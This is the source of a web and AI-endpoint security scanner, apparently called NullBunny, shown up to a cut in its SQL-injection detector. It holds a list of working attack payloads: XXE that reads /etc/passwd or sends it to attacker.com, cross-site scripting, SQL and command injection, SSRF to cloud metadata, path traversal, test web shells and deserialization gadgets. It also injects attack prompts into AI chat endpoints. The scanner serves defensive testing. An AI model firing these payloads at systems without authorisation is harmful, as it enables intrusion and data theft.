import { mkdir, readFile, writeFile } from "node:fs/promises";
import { dirname, resolve } from "node:path";
import { randomUUID } from "node:crypto";
import { chromium, type Page } from "playwright";
import {
  createBuiltinAttackRegistry,
  mergeAttackRegistries,
  resolveAttackEntries,
} from "@nullbunny/attacks";
import { createBuiltinJudgeRegistry, judgeResponseWithRegistry, mergeJudgeRegistries } from "@nullbunny/judges";
import { loadBridgeRegistry } from "@nullbunny/mcp-bridge";
import {
  isLegacyJudgeConfig,
  isPluginJudgeConfig,
  isRegisteredAttackConfig,
  isScanAttackCase,
  type PluginJudgeConfig,
  type ScanAttackCase,
  type ScanAttackEntry,
  type ScanJudgeConfig,
  type ScanOutcome,
} from "@nullbunny/plugin-sdk";
import type { ProviderGenerateResult, ProviderHealthStatus } from "@nullbunny/providers";

export type WebStep =
  | { action: "goto"; url: string }
  | { action: "click"; selector: string }
  | { action: "type"; selector: string; text: string; clear?: boolean }
  | { action: "press"; selector: string; key: string }
  | { action: "wait"; ms: number }
  | { action: "waitForNavigation" }
  | { action: "waitForSelector"; selector: string; timeoutMs?: number };

export interface RecordHarOptions {
  url: string;
  harPath: string;
  stepsPath?: string;
  headed?: boolean;
  harContent?: "omit" | "embed";
  finalWaitMs?: number;
}

export interface AnalyzeHarResult {
  totalRequests: number;
  uniqueRequests: number;
  hosts: Array<{ host: string; count: number }>;
  methods: Array<{ method: string; count: number }>;
  candidateLlms: Array<{ url: string; reason: string }>;
}

export interface WebScanConfig {
  id: string;
  target: string;
  harPath: string;
  candidate?: {
    urlContains?: string;
  };
  bridge?: {
    manifestPaths: string[];
  };
  attacks: ScanAttackEntry[];
  judge: ScanJudgeConfig;
  timeoutMs?: number;
}

export interface WebScanCaseResult {
  caseId: string;
  category: string;
  prompt: string;
  response: string;
  reproCurl?: string;
  outcome: ScanOutcome;
  reason: string;
  latencyMs: number;
}

export interface WebScanRunResult {
  scanId: string;
  target: string;
  provider: ProviderHealthStatus;
  summary: {
    total: number;
    passed: number;
    flagged: number;
    errors: number;
  };
  cases: WebScanCaseResult[];
}

export interface WebCrawlConfig {
  id: string;
  target: string;
  startUrl: string;
  maxDepth: number;
  maxPages: number;
  sameOriginOnly: boolean;
  timeoutMs?: number;
}

export interface WebCrawlResult {
  id: string;
  target: string;
  pagesCrawled: number;
  endpoints: CrawledEndpoint[];
}

export interface CrawledEndpoint {
  url: string;
  method: string;
  links: string[];
  forms: CrawledForm[];
}

export interface CrawledForm {
  action: string;
  method: string;
  fields: string[];
}

export interface WebVulnScanConfig {
  id: string;
  target: string;
  harPath: string;
  vulns: WebVulnScanEntry[];
  timeoutMs?: number;
}

export type WebVulnScanEntry = {
  type: string;
  enabled?: boolean;
} & (
  | { type: "xxe" }
  | { type: "xss" }
  | { type: "sqli" }
  | { type: "ssrf" }
  | { type: "path-traversal" }
  | { type: "cmdi" }
  | { type: "file-upload" }
  | { type: "deserialization" }
);

export interface WebVulnFinding {
  id: string;
  vulnType: string;
  severity: "critical" | "high" | "medium" | "low" | "info";
  url: string;
  method: string;
  payload: string;
  evidence: string;
  reproCurl: string;
  confirmed: boolean;
}

export interface WebVulnScanResult {
  scanId: string;
  target: string;
  summary: {
    total: number;
    critical: number;
    high: number;
    medium: number;
    low: number;
    info: number;
  };
  findings: WebVulnFinding[];
}

export async function recordHar(options: RecordHarOptions): Promise<void> {
  const browser = await chromium.launch({ headless: options.headed ? false : true });
  const context = await browser.newContext({
    recordHar: {
      path: options.harPath,
      content: options.harContent ?? "omit",
    },
  });

  const page = await context.newPage();
  await page.goto(options.url, { waitUntil: "domcontentloaded" });

  if (options.stepsPath) {
    const steps = await loadSteps(options.stepsPath);
    await runSteps(page, steps);
  }

  if (options.finalWaitMs && options.finalWaitMs > 0) {
    await page.waitForTimeout(options.finalWaitMs);
  }

  await context.close();
  await browser.close();
}

export async function crawlWebsite(config: WebCrawlConfig): Promise<WebCrawlResult> {
  const { chromium: crawlChromium } = await import("playwright");
  const browser = await crawlChromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  const visited = new Set<string>();
  const queue: Array<{ url: string; depth: number }> = [{ url: config.startUrl, depth: 0 }];
  const endpoints: CrawledEndpoint[] = [];
  const startOrigin = new URL(config.startUrl).origin;
  const timeoutMs = config.timeoutMs ?? 30_000;

  while (queue.length > 0 && endpoints.length < config.maxPages) {
    const item = queue.shift()!;
    if (item.depth > config.maxDepth) {
      continue;
    }

    const normalizedUrl = normalizeCrawlUrl(item.url);
    if (visited.has(normalizedUrl)) {
      continue;
    }

    visited.add(normalizedUrl);

    try {
      const response = await page.goto(item.url, { waitUntil: "domcontentloaded", timeout: timeoutMs });
      if (!response) {
        continue;
      }
    } catch {
      continue;
    }

    const links = await page.evaluate(() => {
      return Array.from(document.querySelectorAll("a[href]"))
        .map((el) => (el as HTMLAnchorElement).href)
        .filter((href) => href.startsWith("http"));
    });

    const forms = await page.evaluate(() => {
      return Array.from(document.querySelectorAll("form")).map((form) => ({
        action: form.action,
        method: (form.method || "GET").toUpperCase(),
        fields: Array.from(form.querySelectorAll("input, select, textarea"))
          .map((el) => (el as HTMLInputElement).name)
          .filter((name) => name.length > 0),
      }));
    });

    endpoints.push({
      url: item.url,
      method: "GET",
      links,
      forms,
    });

    for (const link of links) {
      if (config.sameOriginOnly) {
        try {
          const linkOrigin = new URL(link).origin;
          if (linkOrigin !== startOrigin) {
            continue;
          }
        } catch {
          continue;
        }
      }

      const normalizedLink = normalizeCrawlUrl(link);
      if (!visited.has(normalizedLink) && item.depth + 1 <= config.maxDepth) {
        queue.push({ url: link, depth: item.depth + 1 });
      }
    }
  }

  await browser.close();

  return {
    id: config.id,
    target: config.target,
    pagesCrawled: endpoints.length,
    endpoints,
  };
}

export function crawlToHarEndpoints(crawledEndpoints: CrawledEndpoint[]): HarEndpoint[] {
  const harEndpoints: HarEndpoint[] = [];
  const seen = new Set<string>();

  for (const endpoint of crawledEndpoints) {
    const getKey = `GET ${endpoint.url}`;
    if (!seen.has(getKey)) {
      seen.add(getKey);
      harEndpoints.push({
        method: "GET",
        url: endpoint.url,
        headers: [],
      });
    }

    for (const form of endpoint.forms) {
      const formMethod = form.method === "GET" ? "GET" : "POST";
      const formKey = `${formMethod} ${form.action}`;
      if (!seen.has(formKey)) {
        seen.add(formKey);
        const postDataFields = form.fields.map((f) => `${encodeURIComponent(f)}=test`).join("&");
        harEndpoints.push({
          method: formMethod,
          url: form.action,
          headers: [],
          postData: {
            text: postDataFields,
            mimeType: "application/x-www-form-urlencoded",
          },
        });
      }
    }
  }

  return harEndpoints;
}

function normalizeCrawlUrl(url: string): string {
  try {
    const parsed = new URL(url);
    parsed.hash = "";
    return parsed.toString();
  } catch {
    return url;
  }
}

export async function analyzeHar(harPath: string): Promise<AnalyzeHarResult> {
  const content = await readFile(harPath, "utf8");
  const parsed = JSON.parse(content) as any;
  const entries: any[] = parsed?.log?.entries ?? [];

  const requestKeys = new Set<string>();
  const hostCounts = new Map<string, number>();
  const methodCounts = new Map<string, number>();
  const candidateLlms: Array<{ url: string; reason: string }> = [];

  for (const entry of entries) {
    const req = entry?.request;
    if (!req?.url || !req?.method) {
      continue;
    }

    const method = String(req.method).toUpperCase();
    const url = String(req.url);

    methodCounts.set(method, (methodCounts.get(method) ?? 0) + 1);

    const host = safeHost(url);
    if (host) {
      hostCounts.set(host, (hostCounts.get(host) ?? 0) + 1);
    }

    const key = `${method} ${url}`;
    requestKeys.add(key);

    const llmReason = inferLlmEndpoint(url, req);
    if (llmReason) {
      candidateLlms.push({ url, reason: llmReason });
    }
  }

  return {
    totalRequests: entries.length,
    uniqueRequests: requestKeys.size,
    hosts: toSortedHostCounts(hostCounts),
    methods: toSortedMethodCounts(methodCounts),
    candidateLlms: dedupeCandidates(candidateLlms),
  };
}

export async function writeAnalyzeResult(
  result: AnalyzeHarResult,
  outputPath: string,
): Promise<void> {
  const abs = resolve(outputPath);
  await mkdir(dirname(abs), { recursive: true });
  await writeFile(abs, JSON.stringify(result, null, 2), "utf8");
}

export async function loadWebScanConfig(filePath: string): Promise<WebScanConfig> {
  const content = await readFile(filePath, "utf8");
  const parsed = JSON.parse(content) as unknown;
  if (!isWebScanConfig(parsed)) {
    throw new Error("Invalid web scan config");
  }
  return normalizeWebScanConfigPaths(parsed, filePath);
}

export async function loadWebVulnScanConfig(filePath: string): Promise<WebVulnScanConfig> {
  const content = await readFile(filePath, "utf8");
  const interpolated = interpolateEnv(content);
  const parsed = JSON.parse(interpolated) as unknown;
  if (!isWebVulnScanConfig(parsed)) {
    throw new Error("Invalid web vuln scan config");
  }
  return normalizeWebVulnScanConfigPaths(parsed, filePath);
}

export async function runWebScan(config: WebScanConfig): Promise<WebScanRunResult> {
  const har = await readHar(config.harPath);
  const template = selectLlmRequestTemplate(har, config.candidate?.urlContains);
  const baseUrl = template ? new URL(template.url).origin : "unknown";

  const providerStatus: ProviderHealthStatus = {
    ok: Boolean(template),
    providerId: "web-har",
    providerType: "openai-compatible",
    baseUrl,
    model: template?.model,
    latencyMs: 0,
    message: template ? "HAR template ready" : "No LLM-like request found in HAR",
  };

  const bridgeRegistry = await loadOptionalBridgeRegistry(config);
  const attackRegistry = mergeAttackRegistries(
    createBuiltinAttackRegistry(),
    bridgeRegistry.attackRegistry,
  );
  const judgeRegistry = mergeJudgeRegistries(
    createBuiltinJudgeRegistry(),
    bridgeRegistry.judgeRegistry,
  );
  const attacks = resolveAttackEntries(config.attacks, attackRegistry);

  if (!template) {
    return {
      scanId: config.id,
      target: config.target,
      provider: providerStatus,
      summary: {
        total: attacks.length,
        passed: 0,
        flagged: 0,
        errors: attacks.length,
      },
      cases: attacks.map((attack) => ({
        caseId: attack.id,
        category: attack.category,
        prompt: attack.prompt,
        response: "",
        reproCurl: "",
        outcome: "error",
        reason: "No LLM-like request found in HAR",
        latencyMs: 0,
      })),
    };
  }

  const normalizedJudge = normalizeJudgeConfig(config.judge);
  const cases: WebScanCaseResult[] = [];

  for (const attack of attacks) {
    const generation = await sendInjectedOpenAICompatibleRequest(
      template,
      attack.prompt,
      config.timeoutMs ?? 15_000,
    );
    const judged = judgeResponseWithRegistry(
      {
        attack,
        generation,
        config: normalizedJudge,
      },
      judgeRegistry,
    );

    cases.push({
      caseId: attack.id,
      category: attack.category,
      prompt: attack.prompt,
      response: generation.ok ? generation.text : "",
      reproCurl: buildReproCurl(template, attack.prompt),
      outcome: judged.outcome,
      reason: judged.reason,
      latencyMs: generation.latencyMs,
    });
  }

  return {
    scanId: config.id,
    target: config.target,
    provider: providerStatus,
    summary: {
      total: cases.length,
      passed: cases.filter((item) => item.outcome === "pass").length,
      flagged: cases.filter((item) => item.outcome === "flagged").length,
      errors: cases.filter((item) => item.outcome === "error").length,
    },
    cases,
  };
}

export async function runWebVulnScan(config: WebVulnScanConfig): Promise<WebVulnScanResult> {
  const har = await readHar(config.harPath);
  const endpoints = extractHarEndpoints(har);
  const enabledVulns = config.vulns.filter((v) => v.enabled !== false);
  const findings: WebVulnFinding[] = [];
  const timeoutMs = config.timeoutMs ?? 10_000;

  for (const endpoint of endpoints) {
    const baseline = await sendBaselineRequest(endpoint, timeoutMs);

    for (const vuln of enabledVulns) {
      const payloads = getPayloadsForVulnType(vuln.type);

      for (const payload of payloads) {
        const injectedRequests = injectPayload(endpoint, payload, vuln.type);

        for (const injected of injectedRequests) {
          const result = await sendVulnProbe(injected, timeoutMs);
          const detection = detectVulnerability(vuln.type, payload, result, baseline);

          if (detection.detected) {
            findings.push({
              id: randomUUID(),
              vulnType: vuln.type,
              severity: detection.severity,
              url: injected.url,
              method: injected.method,
              payload: payload.value,
              evidence: detection.evidence,
              reproCurl: buildVulnReproCurl(injected),
              confirmed: detection.confirmed,
            });
          }
        }
      }
    }
  }

  return {
    scanId: config.id,
    target: config.target,
    summary: {
      total: findings.length,
      critical: findings.filter((f) => f.severity === "critical").length,
      high: findings.filter((f) => f.severity === "high").length,
      medium: findings.filter((f) => f.severity === "medium").length,
      low: findings.filter((f) => f.severity === "low").length,
      info: findings.filter((f) => f.severity === "info").length,
    },
    findings,
  };
}

export async function runWebVulnScanFromEndpoints(
  scanId: string,
  target: string,
  endpoints: HarEndpoint[],
  vulns: WebVulnScanEntry[],
  timeoutMs?: number,
): Promise<WebVulnScanResult> {
  const enabledVulns = vulns.filter((v) => v.enabled !== false);
  const findings: WebVulnFinding[] = [];
  const effectiveTimeout = timeoutMs ?? 10_000;

  for (const endpoint of endpoints) {
    const baseline = await sendBaselineRequest(endpoint, effectiveTimeout);

    for (const vuln of enabledVulns) {
      const payloads = getPayloadsForVulnType(vuln.type);

      for (const payload of payloads) {
        const injectedRequests = injectPayload(endpoint, payload, vuln.type);

        for (const injected of injectedRequests) {
          const result = await sendVulnProbe(injected, effectiveTimeout);
          const detection = detectVulnerability(vuln.type, payload, result, baseline);

          if (detection.detected) {
            findings.push({
              id: randomUUID(),
              vulnType: vuln.type,
              severity: detection.severity,
              url: injected.url,
              method: injected.method,
              payload: payload.value,
              evidence: detection.evidence,
              reproCurl: buildVulnReproCurl(injected),
              confirmed: detection.confirmed,
            });
          }
        }
      }
    }
  }

  return {
    scanId,
    target,
    summary: {
      total: findings.length,
      critical: findings.filter((f) => f.severity === "critical").length,
      high: findings.filter((f) => f.severity === "high").length,
      medium: findings.filter((f) => f.severity === "medium").length,
      low: findings.filter((f) => f.severity === "low").length,
      info: findings.filter((f) => f.severity === "info").length,
    },
    findings,
  };
}

type VulnPayload = {
  value: string;
  injectionPoint: "query" | "body" | "header" | "xml-body" | "cookie";
  fileName?: string;
  fileContent?: string;
};

type HarEndpoint = {
  method: string;
  url: string;
  headers: Array<{ name: string; value: string }>;
  postData?: { text?: string; mimeType?: string };
};

type VulnProbeRequest = {
  method: string;
  url: string;
  headers: Record<string, string>;
  body?: string;
};

type VulnProbeResponse = {
  status: number;
  body: string;
  latencyMs: number;
};

type BaselineResponse = {
  status: number;
  body: string;
  bodyLength: number;
};

type DetectionResult = {
  detected: boolean;
  severity: "critical" | "high" | "medium" | "low" | "info";
  evidence: string;
  confirmed: boolean;
};

function extractHarEndpoints(har: any): HarEndpoint[] {
  const entries: any[] = har?.log?.entries ?? [];
  const endpoints: HarEndpoint[] = [];

  for (const entry of entries) {
    const req = entry?.request;
    if (!req?.url || !req?.method) {
      continue;
    }

    const method = String(req.method).toUpperCase();
    const url = String(req.url);

    if (!["GET", "POST", "PUT", "PATCH", "DELETE"].includes(method)) {
      continue;
    }

    const headers: Array<{ name: string; value: string }> = [];
    if (Array.isArray(req.headers)) {
      for (const h of req.headers) {
        if (typeof h?.name === "string" && typeof h?.value === "string") {
          headers.push({ name: h.name, value: h.value });
        }
      }
    }

    const endpoint: HarEndpoint = { method, url, headers };

    if (req.postData) {
      endpoint.postData = {
        text: typeof req.postData.text === "string" ? req.postData.text : undefined,
        mimeType: typeof req.postData.mimeType === "string" ? req.postData.mimeType : undefined,
      };
    }

    endpoints.push(endpoint);
  }

  return endpoints;
}

function getPayloadsForVulnType(vulnType: string): VulnPayload[] {
  const registry: Record<string, VulnPayload[]> = {
    xxe: [
      { value: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', injectionPoint: "xml-body" },
      { value: '<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><root/>', injectionPoint: "xml-body" },
      { value: '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%send;]><root/>', injectionPoint: "xml-body" },
      { value: '+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-root+AD4-+ACY-xxe;+ADw-/root+AD4-', injectionPoint: "xml-body" },
      { value: '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root></body></foreignObject></svg>', injectionPoint: "xml-body" },
    ],
    xss: [
      { value: "<script>alert(1)</script>", injectionPoint: "query" },
      { value: '<img src=x onerror=alert(1)>', injectionPoint: "query" },
      { value: "<svg onload=alert(1)>", injectionPoint: "query" },
      { value: "<body onload=alert(1)>", injectionPoint: "query" },
      { value: "%3Cscript%3Ealert(1)%3C/script%3E", injectionPoint: "query" },
      { value: "${alert(1)}", injectionPoint: "query" },
      { value: "<script>alert('XSS-Header')</script>", injectionPoint: "header" },
      { value: "<script>alert('XSS-Cookie')</script>", injectionPoint: "cookie" },
    ],
    sqli: [
      { value: "' OR '1'='1", injectionPoint: "query" },
      { value: "' UNION SELECT NULL,NULL,NULL--", injectionPoint: "query" },
      { value: "' AND 1=CONVERT(int,(SELECT @@version))--", injectionPoint: "query" },
      { value: "' WAITFOR DELAY '0:0:5'--", injectionPoint: "query" },
      { value: "' AND 1=1--", injectionPoint: "query" },
      { value: "' OR '1'='1", injectionPoint: "header" },
      { value: "' OR '1'='1", injectionPoint: "cookie" },
    ],
    ssrf: [
      { value: "http://127.0.0.1/admin", injectionPoint: "query" },
      { value: "http://169.254.169.254/latest/meta-data/", injectionPoint: "query" },
      { value: "http://metadata.google.internal/computeMetadata/v1/", injectionPoint: "query" },
      { value: "http://0.0.0.0/", injectionPoint: "query" },
      { value: "http://localtest.me/", injectionPoint: "query" },
      { value: "http://127.0.0.1/admin", injectionPoint: "header" },
      { value: "http://127.0.0.1/admin", injectionPoint: "cookie" },
    ],
    "path-traversal": [
      { value: "../../../etc/passwd", injectionPoint: "query" },
      { value: "..%2F..%2F..%2Fetc%2Fpasswd", injectionPoint: "query" },
      { value: "....//....//....//etc/passwd", injectionPoint: "query" },
      { value: "../../../etc/passwd%00.png", injectionPoint: "query" },
      { value: "..%c0%af..%c0%af..%c0%afetc/passwd", injectionPoint: "query" },
    ],
    cmdi: [
      { value: "; cat /etc/passwd", injectionPoint: "query" },
      { value: "| cat /etc/passwd", injectionPoint: "query" },
      { value: "$(cat /etc/passwd)", injectionPoint: "query" },
      { value: "`cat /etc/passwd`", injectionPoint: "query" },
      { value: "& cat /etc/passwd", injectionPoint: "query" },
    ],
    "file-upload": [
      { value: "webshell.php", injectionPoint: "body", fileName: "test.php", fileContent: "<?php echo 'VULN_UPLOAD_TEST'; ?>" },
      { value: "webshell.jsp", injectionPoint: "body", fileName: "test.jsp", fileContent: "<% out.print(\"VULN_UPLOAD_TEST\"); %>" },
      { value: "webshell.asp", injectionPoint: "body", fileName: "test.asp", fileContent: "<% Response.Write(\"VULN_UPLOAD_TEST\") %>" },
      { value: "htaccess", injectionPoint: "body", fileName: ".htaccess", fileContent: "AddType application/x-httpd-php .jpg" },
      { value: "svg-xss", injectionPoint: "body", fileName: "test.svg", fileContent: "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('XSS')\"></svg>" },
    ],
    deserialization: [
      { value: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhw/////HcIAAAAAAAAACB4', injectionPoint: "body" },
      { value: 'O:8:"stdClass":0:{}', injectionPoint: "body" },
      { value: 'O:8:"stdClass":1:{s:3:"cmd";s:12:"cat /etc/passwd";}', injectionPoint: "body" },
      { value: '{"__class__":"java.lang.Runtime","method":"exec","args":["cat /etc/passwd"]}', injectionPoint: "body" },
      { value: '<java><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="2"><void index="0"><string>cat</string></void><void index="1"><string>/etc/passwd</string></void></array><void method="start"/></object></java>', injectionPoint: "xml-body" },
    ],
  };

  return registry[vulnType] ?? [];
}

function injectPayload(endpoint: HarEndpoint, payload: VulnPayload, vulnType: string): VulnProbeRequest[] {
  const requests: VulnProbeRequest[] = [];
  const headers = normalizeHeaders(endpoint.headers);

  if (payload.fileName && payload.fileContent) {
    const boundary = `----NullBunnyBoundary${randomUUID().replace(/-/g, "")}`;
    const parts: Buffer[] = [];

    const bodyText = endpoint.postData?.text;
    if (bodyText) {
      const mimeType = endpoint.postData?.mimeType ?? "";
      if (mimeType.includes("application/x-www-form-urlencoded")) {
        try {
          const params = new URLSearchParams(bodyText);
          for (const [key, val] of params.entries()) {
            parts.push(Buffer.from(
              `--${boundary}\r\nContent-Disposition: form-data; name="${key}"\r\n\r\n${val}\r\n`
            ));
          }
        } catch {}
      } else if (mimeType.includes("application/json")) {
        try {
          const parsed = JSON.parse(bodyText) as Record<string, unknown>;
          for (const [key, val] of Object.entries(parsed)) {
            if (typeof val === "string") {
              parts.push(Buffer.from(
                `--${boundary}\r\nContent-Disposition: form-data; name="${key}"\r\n\r\n${val}\r\n`
              ));
            }
          }
        } catch {}
      }
    }

    parts.push(Buffer.from(
      `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${payload.fileName}"\r\nContent-Type: application/octet-stream\r\n\r\n${payload.fileContent}\r\n`
    ));
    parts.push(Buffer.from(`--${boundary}--\r\n`));

    const body = Buffer.concat(parts).toString("utf-8");
    requests.push({
      method: "POST",
      url: endpoint.url,
      headers: { ...headers, "content-type": `multipart/form-data; boundary=${boundary}` },
      body,
    });

    if (endpoint.method !== "POST") {
      requests.push({
        method: endpoint.method,
        url: endpoint.url,
        headers: { ...headers, "content-type": `multipart/form-data; boundary=${boundary}` },
        body,
      });
    }

    return requests;
  }

  if (payload.injectionPoint === "xml-body") {
    requests.push({
      method: "POST",
      url: endpoint.url,
      headers: { ...headers, "content-type": "application/xml" },
      body: payload.value,
    });
    if (endpoint.method !== "POST") {
      requests.push({
        method: endpoint.method,
        url: endpoint.url,
        headers: { ...headers, "content-type": "application/xml" },
        body: payload.value,
      });
    }
    return requests;
  }

  if (payload.injectionPoint === "header") {
    const targetHeaders = ["x-forwarded-for", "user-agent", "referer", "host", "x-api-version"];
    for (const target of targetHeaders) {
      requests.push({
        method: endpoint.method,
        url: endpoint.url,
        headers: { ...headers, [target]: payload.value },
        body: endpoint.postData?.text,
      });
    }

    for (const key of Object.keys(headers)) {
      if (key !== "cookie" && key !== "content-type" && key !== "content-length") {
        requests.push({
          method: endpoint.method,
          url: endpoint.url,
          headers: { ...headers, [key]: payload.value },
          body: endpoint.postData?.text,
        });
      }
    }
    return requests;
  }

  if (payload.injectionPoint === "cookie") {
    const cookieStr = headers["cookie"] || "";
    if (cookieStr) {
      const cookies = cookieStr.split(";").map((c) => c.trim());
      for (let i = 0; i < cookies.length; i++) {
        const parts = cookies[i].split("=");
        const key = parts[0];
        if (key) {
          const newCookies = [...cookies];
          newCookies[i] = `${key}=${payload.value}`;
          requests.push({
            method: endpoint.method,
            url: endpoint.url,
            headers: { ...headers, cookie: newCookies.join("; ") },
            body: endpoint.postData?.text,
          });
        }
      }
    } else {
      requests.push({
        method: endpoint.method,
        url: endpoint.url,
        headers: { ...headers, cookie: `session_id=${payload.value}` },
        body: endpoint.postData?.text,
      });
    }
    return requests;
  }

  const urlObj = new URL(endpoint.url);
  const queryParams = Array.from(urlObj.searchParams.entries());

  if (payload.injectionPoint === "query") {
    if (queryParams.length > 0) {
      for (const [key] of queryParams) {
        const testUrl = new URL(endpoint.url);
        testUrl.searchParams.set(key, payload.value);
        requests.push({
          method: endpoint.method,
          url: testUrl.toString(),
          headers,
          body: endpoint.postData?.text,
        });
      }
    } else {
      const testUrl = new URL(endpoint.url);
      testUrl.searchParams.set("q", payload.value);
      requests.push({
        method: endpoint.method,
        url: testUrl.toString(),
        headers,
        body: endpoint.postData?.text,
      });
      requests.push({
        method: "POST",
        url: endpoint.url,
        headers: { ...headers, "content-type": "application/x-www-form-urlencoded" },
        body: `input=${encodeURIComponent(payload.value)}`,
      });
      requests.push({
        method: "POST",
        url: endpoint.url,
        headers: { ...headers, "content-type": "application/json" },
        body: JSON.stringify({ input: payload.value, query: payload.value, data: payload.value }),
      });
    }
  }

  if (payload.injectionPoint === "query" || payload.injectionPoint === "body") {
    const bodyText = endpoint.postData?.text;
    if (bodyText) {
      const mimeType = endpoint.postData?.mimeType ?? "";

      if (mimeType.includes("application/json")) {
        try {
          const parsed = JSON.parse(bodyText) as Record<string, unknown>;
          const injected = injectPayloadIntoJsonFields(parsed, payload.value);
          requests.push({
            method: endpoint.method,
            url: endpoint.url,
            headers,
            body: JSON.stringify(injected),
          });
        } catch {
          requests.push({
            method: endpoint.method,
            url: endpoint.url,
            headers,
            body: payload.value,
          });
        }
      } else if (mimeType.includes("application/x-www-form-urlencoded")) {
        try {
          const params = new URLSearchParams(bodyText);
          const keys = Array.from(params.keys());
          for (const key of keys) {
            const injected = new URLSearchParams(bodyText);
            injected.set(key, payload.value);
            requests.push({
              method: endpoint.method,
              url: endpoint.url,
              headers,
              body: injected.toString(),
            });
          }
        } catch {
          requests.push({
            method: endpoint.method,
            url: endpoint.url,
            headers,
            body: payload.value,
          });
        }
      } else {
        requests.push({
          method: endpoint.method,
          url: endpoint.url,
          headers,
          body: payload.value,
        });
      }
    } else if (endpoint.method === "GET" || endpoint.method === "HEAD") {
      requests.push({
        method: "POST",
        url: endpoint.url,
        headers: { ...headers, "content-type": "application/x-www-form-urlencoded" },
        body: `input=${encodeURIComponent(payload.value)}`,
      });
      requests.push({
        method: "POST",
        url: endpoint.url,
        headers: { ...headers, "content-type": "application/json" },
        body: JSON.stringify({ input: payload.value, query: payload.value, data: payload.value }),
      });
    }
  }

  return requests.length > 0 ? requests : [{
    method: endpoint.method,
    url: endpoint.url,
    headers,
    body: endpoint.postData?.text,
  }];
}

function injectPayloadIntoJsonFields(obj: Record<string, unknown>, payload: string): Record<string, unknown> {
  const result: Record<string, unknown> = {};
  for (const [key, value] of Object.entries(obj)) {
    if (typeof value === "string") {
      result[key] = payload;
    } else if (isRecord(value) && !Array.isArray(value)) {
      result[key] = injectPayloadIntoJsonFields(value as Record<string, unknown>, payload);
    } else {
      result[key] = value;
    }
  }
  return result;
}

async function sendBaselineRequest(endpoint: HarEndpoint, timeoutMs: number): Promise<BaselineResponse> {
  const headers = normalizeHeaders(endpoint.headers);
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const response = await fetch(endpoint.url, {
      method: endpoint.method,
      headers,
      body: ["GET", "HEAD"].includes(endpoint.method) ? undefined : endpoint.postData?.text,
      signal: controller.signal,
    });

    const body = await response.text();
    return { status: response.status, body, bodyLength: body.length };
  } catch {
    return { status: 0, body: "", bodyLength: 0 };
  } finally {
    clearTimeout(timer);
  }
}

async function sendVulnProbe(request: VulnProbeRequest, timeoutMs: number): Promise<VulnProbeResponse> {
  const startedAt = Date.now();
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const response = await fetch(request.url, {
      method: request.method,
      headers: request.headers,
      body: ["GET", "HEAD"].includes(request.method) ? undefined : request.body,
      signal: controller.signal,
    });

    const body = await response.text();
    return { status: response.status, body, latencyMs: Date.now() - startedAt };
  } catch {
    return { status: 0, body: "", latencyMs: Date.now() - startedAt };
  } finally {
    clearTimeout(timer);
  }
}

function detectVulnerability(vulnType: string, payload: VulnPayload, response: VulnProbeResponse, baseline: BaselineResponse): DetectionResult {
  if (vulnType === "xxe") {
    return detectXxe(payload, response, baseline);
  }
  if (vulnType === "xss") {
    return detectXss(payload, response, baseline);
  }
  if (vulnType === "sqli") {
    return detectSqli(payload, response, baseline);
  }
  if (vulnType === "ssrf") {
    return detectSsrf(payload, response, baseline);
  }
  if (vulnType === "path-traversal") {
    return detectPathTraversal(payload, response, baseline);
  }
  if (vulnType === "cmdi") {
    return detectCmdi(payload, response, baseline);
  }
  if (vulnType === "file-upload") {
    return detectFileUpload(payload, response, baseline);
  }
  if (vulnType === "deserialization") {
    return detectDeserialization(payload, response, baseline);
  }
  return { detected: false, severity: "info", evidence: "", confirmed: false };
}

function detectXxe(payload: VulnPayload, response: VulnProbeResponse, baseline: BaselineResponse): DetectionResult {
  const passwdPattern = /root:x:0:0|bin:x:\d+:\d+|daemon:x:\d+:\d+/;
  const match = passwdPattern.exec(response.body);
  if (match) {
    return {
      detected: true,
      severity: "critical",
      evidence: `File content detected in response: ${match[0]}`,
      confirmed: true,
    };
  }

  if (response.status !== baseline.status && response.body.length !== baseline.bodyLength && response.body.length > baseline.bodyLength) {
    return {
      detected: true,
      severity: "medium",
      evidence: `Response differs from baseline (status ${response.status} vs ${baseline.status}, length ${response.body.length} vs ${baseline.bodyLength})`,
      confirmed: false,
    };
  }

  return { detected: false, severity: "info", evidence: "", confirmed: false };
}

function detectXss(payload: VulnPayload, response: VulnProbeResponse, baseline: BaselineResponse): DetectionResult {
  const decodedPayload = decodeURIComponent(payload.value);
  if (response.body.includes(decodedPayload) || response.body.includes(payload.value)) {
    return {
      detected: true,
      severity: "high",
      evidence: `Payload reflected unescaped in response: ${decodedPayload.substring(0, 80)}`,
      confirmed: true,
    };
  }

  const lowerBody = response.body.toLowerCase();
  const scriptPatterns = ["<script", "onerror=", "onload=", "onmouseover="];
  for (const pattern of scriptPatterns) {
    if (lowerBody.includes(pattern) && !baseline.body.toLowerCase().includes(pattern)) {
      return {
        detected: true,
        severity: "medium",
        evidence: `Script pattern found in response that was not in baseline: ${pattern}`,
        confirmed: false,
      };
    }
  }

  return { detected: false, severity: "info", evidence: "", confirmed: false };
}

function detectSqli(payload: VulnPayload, response: VulnProbeResponse, baseline: BaselineResponse): DetectionResult {
  const sqlErrorPatterns = [
    /sql syntax.*mysql/i,
    /warning.*mysql/i,
    /valid mysql result/i,
    /check the manual that (corresponds to|fits) your mysql server/i,
    /postgresql.*error/i,
